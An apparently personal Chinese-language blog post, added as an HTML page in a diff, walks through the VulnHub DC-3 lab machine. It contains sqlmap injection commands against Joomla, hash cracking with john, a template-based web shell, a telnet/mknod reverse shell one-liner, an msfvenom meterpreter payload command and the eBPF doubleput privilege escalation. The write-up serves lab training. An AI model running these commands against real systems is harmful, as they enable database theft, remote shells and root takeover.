@@ -1,0 +1,299 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>DC-3 · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2024-08-02">2024年8月2日</time>
+        
+        
+          <span class="post__readtime">7 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/vulnhub%E9%9D%B6%E6%9C%BA/">#vulnhub靶机</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">DC-3</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <h1 id="一、靶机安装"><a href="#一、靶机安装" class="headerlink" title="一、靶机安装"></a>一、靶机安装</h1><p>靶机下载地址<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-32,312/">DC: 3.2</a></p>
+<p>下载压缩包后得到<code>DC-3.ova</code>文件，将其用VMware打开。</p>
+<p><img src="/../img/Typora/P%5D3%25U%5B2(%60$ZHD6@)V7RQEXJ.png"></p>
+<p>设置好虚拟机名称和存储路径之后，导入虚拟机</p>
+<p><img src="/../img/Typora/image-20240802223906209.png"></p>
+<p>导入失败点击重试即可</p>
+<p><img src="/../img/Typora/image-20240802223939080.png"></p>
+<p>将网络设置改为nat模式</p>
+<p><img src="/../img/Typora/image-20240802224054680.png"></p>
+<p>这里报错的话需要我们将磁盘设置改一下</p>
+<p><img src="/../img/Typora/image-20240802224123719.png"></p>
+<p>将IDE设备重<code>0:1</code>改为<code>0:0</code></p>
+<p><img src="/../img/Typora/image-20240802224256975.png"></p>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h2><p><img src="/../img/Typora/image-20240802224828790.png"></p>
+<h2 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h2><p>只在80端口开放了http服务</p>
+<p><img src="/../img/Typora/image-20240802225912582.png"></p>
+<h1 id="三、访问web页面"><a href="#三、访问web页面" class="headerlink" title="三、访问web页面"></a>三、访问web页面</h1><p><img src="/../img/Typora/image-20240802230018169.png"></p>
+<p>在登录框处试了试弱口令，sql万能密码。无成果</p>
+<p>用<code>dirsearch</code>进行一波目录扫描</p>
+<p><img src="/../img/Typora/image-20240802230513762.png"></p>
+<p>扫到了很多东西，扫出了后台登录页面<code>/administrator/</code>。</p>
+<p><img src="/../img/Typora/image-20240802230625248.png"></p>
+<p>在这个页面尝试了，弱口令、sql万能密码也没有任何成果。</p>
+<p>上面用dirsearch扫描出了很多目录，访问了之后，大多也是空白页面，没有任何回显。</p>
+<p>在网站<code>README.txt</code>文件中找到了cms的版本</p>
+<p><img src="/../img/Typora/image-20240802231153944.png"></p>
+<p>​	在网上搜了一下，发现这个版本存在sql注入漏洞</p>
+<p><img src="/../img/Typora/image-20240802231236632.png"></p>
+<p>用上面的poc来验证，确实存在SQL注入漏洞。</p>
+<p><img src="/../img/Typora/image-20240802231429968.png"></p>
+<p>因为没有什么过滤，为了节省时间，这里我就用sqlmap跑了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.72.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot; --batch --dbs  --flush-session   </span><br></pre></td></tr></table></figure>
+
+<p>跑库名</p>
+<p><img src="/../img/Typora/image-20240802232511758.png"></p>
+<p>跑表，跑出了70多个表名，我注意到俩表<code>#__dsms_admin</code>和<code>#__users</code>这两个表是最有可能存放。后台管理员账号和密码的地方。</p>
+<p>烦人的是，，它每个表名都是以<code>#</code>开头的 这对跑字段造成了不小的麻烦</p>
+<p>跑<code>#__users</code>的字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.72.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot; -D joomladb -T &quot;#__users&quot; --columns  --flush-session</span><br></pre></td></tr></table></figure>
+
+<p><code>#__dsms_admin</code>表我没有跑出什么东西，这里就不写了。。。。</p>
+<p><img src="/../img/Typora/image-20240802234120289.png"></p>
+<p>跑账号和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.72.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot; -D joomladb -T &quot;#__users&quot; -C username,password  --flush-session --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240802234452192.png"></p>
+<p>账号和密码是被加密过的，用<code>john</code>爆破试试看</p>
+<p>先将密文保存到一个文件中，然后用john爆破</p>
+<p><img src="/../img/Typora/image-20240802235707565.png"></p>
+<p>这里出了点小问题。</p>
+<p>本来使用<code>john 1.txt</code> 也可以解出来的。但是我这边不知道怎么出问题了，加了<code>--show</code>才会显示</p>
+<p>拿到<code>admin</code>账号和密码了。现在去登录后台</p>
+<p><img src="/../img/Typora/image-20240803000848904.png"></p>
+<p><code>joomla</code>后台有一处远程代码执行的漏洞<a target="_blank" rel="noopener" href="https://www.cnblogs.com/starci/p/15174896.html">【漏洞复现 CVE-2021-23132】Joomla远程代码执行漏洞</a></p>
+<p>在模板编辑页面，我们可以直接修改源码</p>
+<p><img src="/../img/Typora/image-20240803001114111.png"></p>
+<p>在error页面先die一个试试</p>
+<p><img src="/../img/Typora/image-20240803001208101.png"></p>
+<p>那么问题来了。。。</p>
+<p>我们应该如果访问到这个页面？我们怎么知道这个页面的路径？</p>
+<p>这时想到了前面目录扫描的时候，扫出的一个目录</p>
+<p><img src="/../img/Typora/image-20240803001509126.png"></p>
+<p>这个目录就是<code>Template</code>模板+<code>Beez3</code>模板名</p>
+<p><img src="/../img/Typora/image-20240803001610807.png"></p>
+<p>或许可以在后面直接拼接个<code>error.php</code>?</p>
+<p>命令成功执行。</p>
+<p><img src="/../img/Typora/image-20240803001733435.png" alt="image-20240803001733435"></p>
+<p>写马</p>
+<p><img src="/../img/Typora/image-20240803001859321.png"></p>
+<p>连上之后这里我先将shell弹到了我的ubuntu上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f x; mknod x p &amp;&amp; telnet 192.168.72.128 7777 0&lt;x | /bin/bash 1&gt;x</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240803002832983.png"></p>
+<p>用python生成了一个伪终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20240803002952925.png" alt="image-20240803002952925"></p>
+<h1 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h1><p>这里Ubuntu版本是<code>Ubuntu 16.04</code>去找找看有没有什么漏洞</p>
+<p><img src="/../img/Typora/image-20240803003041933.png"></p>
+<p><img src="/../img/Typora/image-20240803003226082.png"></p>
+<p>这里用<code>linux/local/39772.txt</code>来进行提权</p>
+<p>看一下详细信息</p>
+<p><img src="/../img/Typora/image-20240803003327686.png"></p>
+<p><code>/usr/share/exploitdb/exploits/linux/local/39772.txt</code>文件中有exp下载地址</p>
+<p><img src="/../img/Typora/image-20240803003411525.png"></p>
+<p>用wegt在目标机器上面下载这个zip</p>
+<p><img src="/../img/Typora/image-20240803003551210.png"></p>
+<p>解压</p>
+<p><img src="/../img/Typora/image-20240803003620253.png"></p>
+<p>进入39772目录，解压<code>exploit.tar</code></p>
+<p><img src="/../img/Typora/image-20240803003811662.png"></p>
+<p>进入<code>ebpf_mapfd_doubleput_exploit</code>然后bash运行<code>compile.sh</code>来编译环境</p>
+<p><img src="/../img/Typora/image-20240803003928128.png"></p>
+<p>运行<code>doubleput</code></p>
+<p><img src="/../img/Typora/image-20240803004145697.png"></p>
+<h1 id="五、DC-3打靶碎碎念"><a href="#五、DC-3打靶碎碎念" class="headerlink" title="五、DC-3打靶碎碎念"></a>五、DC-3打靶碎碎念</h1><p>打靶流程已经结束。。。</p>
+<p>这部分写的是我在打靶的过程中遇到的一些趣事</p>
+<h2 id="1-前台"><a href="#1-前台" class="headerlink" title="1.前台"></a>1.前台</h2><p>访问页面时，我并没有第一时间去寻找该cms的历史漏洞。</p>
+<p>看见有登录框，我先在这个功能点尝试了几个弱口令，以及SQL。但是并没有什么成效。</p>
+<p>然后我又用<code>dirsearch</code>进行了一次目录扫描。</p>
+<p>从扫描结果来看，我发现了许多目录，还有文件。</p>
+<p>有这样一个目录<code>/administrator/includes/</code>，打开了目录浏览功能</p>
+<p><img src="/../img/Typora/image-20240805101016190.png"></p>
+<p>不过依次访问后都是白屏，我没有发现什么可以利用的点。</p>
+<h2 id="2-后台"><a href="#2-后台" class="headerlink" title="2.后台"></a>2.后台</h2><p>首先在<code>System</code>  &#x3D;&gt; <code>Global Configuration</code> &#x3D;&gt; <code>Media</code>找到几个白名单</p>
+<p><img src="/../img/Typora/image-20240805110805977.png"></p>
+<p>然后就只在文章编辑处找到了一个文件上传功能</p>
+<p><img src="/../img/Typora/image-20240805111752114.png"></p>
+<p>但是php文件仍然无法上传过去。也没有什么具体的报错信息。我没办法进行进一步利用</p>
+<p>然后上网看了看在模板页面可以直接编辑源码。</p>
+<p>其实这里应该怪我自己信息收集没做到位，做到位的话完全可以自己写的。</p>
+<h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>用<code>cat /etc/passwd</code>查看了。靶机的发行版本是<code>Ubuntu 16.04 LTS </code>后，我在msf上面发现了一个攻击<code>Ubuntu 16.04 </code>的exp，貌似还</p>
+<p><img src="/../img/Typora/image-20240805151143576.png"></p>
+<p>然后就想着用这个模块进行提权。用了这个模块之后<code>option </code>查看配置项。发现只需要设置一个<code>session</code>就行了</p>
+<p>不知道这个session是什么东西。上午查了一下，就是msf要与对方机器建立一个对话。然后这个session就是对话的意思</p>
+<p><img src="/../img/Typora/image-20240805151545809.png"></p>
+<p>使用<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.72.135 LPORT=7777 -f elf &gt; asd</code>生成了一个木马文件。</p>
+<p>将其上传到<code>/tmp</code>目录下</p>
+<img src="../img/Typora/image-20240805152203709.png" alt="image-20240805152203709" style="zoom:50%;" />
+
+<p>将shell反弹到msf上，然后将其放到后台</p>
+<p><img src="/../img/Typora/image-20240805153314153.png"></p>
+<p>然后使用刚刚的exp模块进行攻击时，发现失败了。。。。。。</p>
+<p><img src="/../img/Typora/image-20240805153314153.png"></p>
+<p>​	</p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-10-27">2024·10·27</time>
+          <a class="related__link" href="/2024/10/27/%E9%9D%B6%E6%9C%BA/hackmyvm/Hacker_Kid-v1.0.1/">Hacker_Kid-v1.0.1</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-10-10">2024·10·10</time>
+          <a class="related__link" href="/2024/10/10/%E9%9D%B6%E6%9C%BA/lazySysAdmin/">lazySysAdmin</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-09-27">2024·09·27</time>
+          <a class="related__link" href="/2024/09/27/%E9%9D%B6%E6%9C%BA/driftingblues2/">driftingblues2</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2024/08/05/%E9%9D%B6%E6%9C%BA/DC-4/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">DC-4</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2024/07/31/%E9%9D%B6%E6%9C%BA/DC-1/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">DC-1</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
